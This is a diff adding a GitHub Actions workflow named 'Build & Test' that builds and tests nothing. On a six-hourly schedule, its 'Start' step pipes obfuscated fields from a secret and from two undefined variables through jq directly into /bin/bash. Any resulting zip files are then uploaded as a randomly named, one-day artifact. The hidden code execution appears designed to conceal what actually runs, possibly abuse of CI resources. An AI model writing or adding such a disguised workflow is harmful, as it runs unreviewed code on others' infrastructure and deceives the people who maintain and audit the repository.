@@ -1,0 +1,33 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          rc1140: ${{ secrets.rc1140 }}
+        run: |
+          printf '%s' "$rc1140" | jq -r .dn62169 | /bin/bash
+          printf '%s' "$aphqh7" | jq -r .urdg052 | /bin/bash
+          printf '%s' "$y4881" | jq -r .ogojr1862 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: QKtEmE8G
+          path: "*.zip"
+          retention-days: 1
